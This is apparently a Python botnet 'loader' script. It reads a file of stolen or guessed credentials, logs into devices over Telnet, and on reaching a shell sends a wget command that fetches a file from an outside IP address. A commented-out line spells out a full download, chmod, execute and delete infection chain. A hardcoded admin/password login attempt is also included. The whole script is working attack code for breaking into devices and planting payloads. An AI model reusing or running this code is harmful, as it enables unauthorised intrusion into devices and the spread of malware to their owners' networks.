import telnetlib
import sys
import os
import json
from libs import truecolors

Host_IP = ""

def read_config_ip():
    filename = 'ip_config.ini'
    with open(filename, 'r') as file:
        json_data = json.load(file)
    RelayIP = json_data['RelayIP']
    targetIP = json_data['targetIP']
    return RelayIP, targetIP

def doTelnetLogin(ip, port, user, pass_):
    tn = None
    need_user = False
    while True:
        try:
            if not tn:
                asked_password_in_cnx = False
                tn = telnetlib.Telnet(ip, port)
                print(f"[loader] Connection established to given ip {ip} {port}" )
            while True:
                response = tn.read_until(b":", 1)
                if "Login:" in str(response) or "Username:" in str(response) or "login:" in str(response):
                    print("[loader] Received username prompt")
                    need_user = True
                    asked_password_in_cnx = False
                    user, password = user, pass_
                    tn.write((user + "\n").encode('ascii'))
                elif "Password:" in str(response) or "password" in str(response):  
                    if asked_password_in_cnx and need_user:
                        tn.close()
                        break
                    asked_password_in_cnx = True
                    if not need_user:
                        user, password = user, pass_
                    if not password:
                        print("[loader] Login has failed...quitting.")
                        sys.exit(0)
                    print("[loader] Received password prompt")
                    tn.write((password + "\n").encode('ascii'))
                if ">" in str(response) or "$" in str(response) or "#" in str(response) or "%" in str(response):
                    # broken
                    print("[loader] Login succeeded %s " % ip +" --> "+ ' : '.join((user, password)))
                    response = tn.read_until(b"#", 1)
                    #tn.write(("cd /tmp; cd/var/run; cd /mnt; cd/root; wget %s; chmod +x %s; ./%s; rm -rf %s;" % (__bin__,os.path.basename(__bin__), os.path.basename(__bin__), os.path.basename(__bin__)) + "\n").encode('ascii'))
                    tn.write("wget http://140.123.97.150/test\n".encode('ascii'))  # 使用指令查看   
                    print("Exec command "+"wget http://140.123.97.150/test\n" +"--> Successful")                
                    print("[loader] This device is broken.")
                    return
        except EOFError as e:
            tn = None
            need_user = False
            print("[scanner] Remote host dropped the connection (%s).." % str(e))

def doSSHLogin(ip, port, user, pass_):

    


    pass

def ForceDB(fname):
    try:
        if os.path.isfile(fname):
            with open(fname) as f:
                for line in f:
                    usr,psw,ip,port = line.split(":")
                    '''
                    usr = line.split(':')[0].rstrip()
                    psw = line.split(':')[1].rstrip()
                    ip = line.split(':')[2].rstrip()
                    port = line.split(':')[3].rstrip()
                    '''
                    doTelnetLogin(ip, port, usr, psw)
        else:
            truecolors.print_errn("Loader: File '%s' doesn't exists, check the path." % fname)
    except KeyboardInterrupt:
        truecolors.print_errn("Operation interrupted.")
    except Exception as e:
        truecolors.print_errn("Loader: " + str(e))


if __name__ == '__main__':
    Host_IP, targerIP = read_config_ip()
    #ForceDB(sys.argv[2])
    doTelnetLogin("192.168.1.167", "23", "admin", "password")
    